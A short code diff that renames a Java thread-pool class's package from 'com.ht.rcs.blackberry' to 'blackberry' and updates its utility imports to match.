@@ -1,10 +1,10 @@
-package com.ht.rcs.blackberry.threadpool;
+package blackberry.threadpool;
 
-import com.ht.rcs.blackberry.utils.ArrayQueue;
-import com.ht.rcs.blackberry.utils.BlockingQueue;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Queue;
+import blackberry.utils.ArrayQueue;
+import blackberry.utils.BlockingQueue;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Queue;
 
 /**
  * implementation of a thread pool.
